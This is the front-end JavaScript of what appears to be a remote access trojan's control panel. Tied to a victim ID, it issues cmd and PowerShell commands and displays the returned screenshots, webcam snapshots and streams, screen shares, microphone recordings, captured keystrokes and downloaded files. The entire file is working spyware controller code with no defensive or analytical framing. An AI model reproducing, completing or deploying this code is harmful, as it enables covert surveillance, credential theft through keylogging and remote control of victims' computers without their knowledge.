

const allPanelbtn = document.querySelectorAll(".panel-bar button[data-value]")
const allDataForm = document.querySelectorAll(".panels .data-form")
const panelTitle = document.querySelector(".panel-title")
const openPanelBar = document.querySelector("#panel-bar-open")
const panelBarContent = document.querySelector(".panel-bar")
const logsContainers = document.querySelectorAll(".logs")
const pingStatus = document.querySelector(`#ping-status`)
const alltxtInputs = document.querySelectorAll("#text-inp")

allPanelbtn.forEach((btn, index, btns) => {
    btn.addEventListener('click', () => {
        allDataForm.forEach(dataForm => {
            dataForm.classList.remove("active")
        })

        logsContainers.forEach(logs => {
            logs.classList.remove("active")
        })

        btns.forEach(btn => {
            btn.classList.remove("active")
        })

        btn.classList.add("active")
        let dataValue = btn.getAttribute("data-value")

        panelTitle.innerHTML = dataValue
        document.querySelector(`.${dataValue}-panel`).classList.add("active")
        document.querySelector(`.${dataValue}-panel-log`).classList.add("active")
        panelBarContent.classList.remove("active")
    })
})

// set command
allDataForm.forEach(form => {
    form.addEventListener("submit", async e => {
        e.preventDefault()

        let data = {}
        let displayCommand = ''
        for (let inp of e.target) {
            let key = inp.name
            let value = inp.value
            if (key.length == 0) continue
            data[key] = value
            displayCommand += `<span class="command">[${key}]-<</span>${value}<span class="command">>-</span>`
        }

        if (data.command == 'python') {
            addLogs(data.command, `<span class="command">[${data.command}]-<</span>${new Date()}`)
        } else {
            addLogs(data.command, displayCommand)
        }

        try {
            const res = await (await axios.post(`/panel?id=${ID}`, data)).data

            if (res.type == "error") {
                popup("error", res.message)
            }
        } catch (err) {
            console.log(err)
            popup("error", err.message)
        }

        alltxtInputs.forEach(inp => {
            inp.value = ""
        })
    })
})

// sidebar
openPanelBar.addEventListener("click", () => {
    panelBarContent.classList.toggle("active")
})

// socket listeners
socket.on("conn-ping", data => {
    if (data.id == ID) {
        document.querySelector(".data-form.cmd-panel span").innerText = `[CMD]-<${data.cwd}>-> `
        document.querySelector(".data-form.powershell-panel span").innerText = `[PS]-<${data.cwd}>-> `
        pingStatus.classList.add("active")
    }
})

socket.on("disconn-ping", data => {
    if (data == ID) {
        pingStatus.classList.remove("active")
    }
})

socket.on(`${ID}-tar-data`, data => {
    console.log(data)
    let value = ''
    let pre = document.createElement("pre")
    if (data.value.startsWith('ERROR:')) {
        pre.innerText = data.value
        value = pre.outerHTML
        addLogs(data.command, value, 1)
        return
    }

    switch (data.command) {
        case "cwd":
            document.querySelector(".data-form.cmd-panel span").innerText = `[CMD]-<${data.value}>-> `
            document.querySelector(".data-form.powershell-panel span").innerText = `[PS]-<${data.value}>-> `
            return;
        case "screenshot":
            value = `[${new Date()}]<br>
            <a href="${data.value}" target="_blank" rel="noopener noreferrer">
                        <img src="${data.value}" alt="screenshot">
                    </a>`
            break;
        case "webcam-snapshot":
            value = `<p>[${new Date()}]</p>
                        <a href="${data.value}" target="_blank" rel="noopener noreferrer">
                            <img src="${data.value}" alt="screenshot">
                        </a>`
            break;
        case "recordmic":
            value = `<p>[${new Date()}]</p>
                        <audio src="${data.value}" controls></audio>`
            break;
        case "keystrokes":
            key = data.value
            let currentLogsContainer = document.querySelector(`.keystrokes-panel-log`)
            const b = document.createElement("b")
            if (key.length != 1) {
                b.className = "gap"
                key = `<span> _${key}_ </span>`
            }
            b.innerHTML = `${key}`
            currentLogsContainer.appendChild(b)
            currentLogsContainer.scrollTop = currentLogsContainer.scrollHeight
            return;
        case "download":
            value = `<p>[${new Date()}]</p>
                    <a href="${data.value}" target="_blank" rel="noopener noreferrer">
                        ${data.value.split("/").slice(-1)}
                    </a>`
            break;
        default:
            pre.innerText = data.value
            value = pre.outerHTML
            break;

    }

    addLogs(data.command, value)
})

const streamers = {
    "webcamstream": 0,
    "screenshare": 0
}
socket.on(`${ID}-tar-stream`, data => {
    console.log(data);
    if (data.value.startsWith('ERROR:')) {
        addLogs(data.command, data.value, 1)
        return
    }

    let currentStreamer = document.querySelector(`.${data.command}-panel-log img`)
    currentStreamer.src = `data:image/jpeg;base64,${data.value}`

    streamers[data.command] += 1
    currentStreamer.parentElement.querySelector(".streamer-status").innerHTML = `FRAME: ${streamers[data.command]}`
})


// logging
function addLogs(command, data, type = 3) {
    const p = document.createElement("p")
    p.innerHTML = data
    if (type == 0) {
        p.className = 'ok'
    } else if (type == 1) {
        p.className = 'err'
    } else if (type == 2) {
        p.className = 'command'
    }

    let logsContainer = document.querySelector(`.${command}-panel-log`)
    logsContainer.appendChild(p)
    logsContainer.scrollTop = logsContainer.scrollHeight
}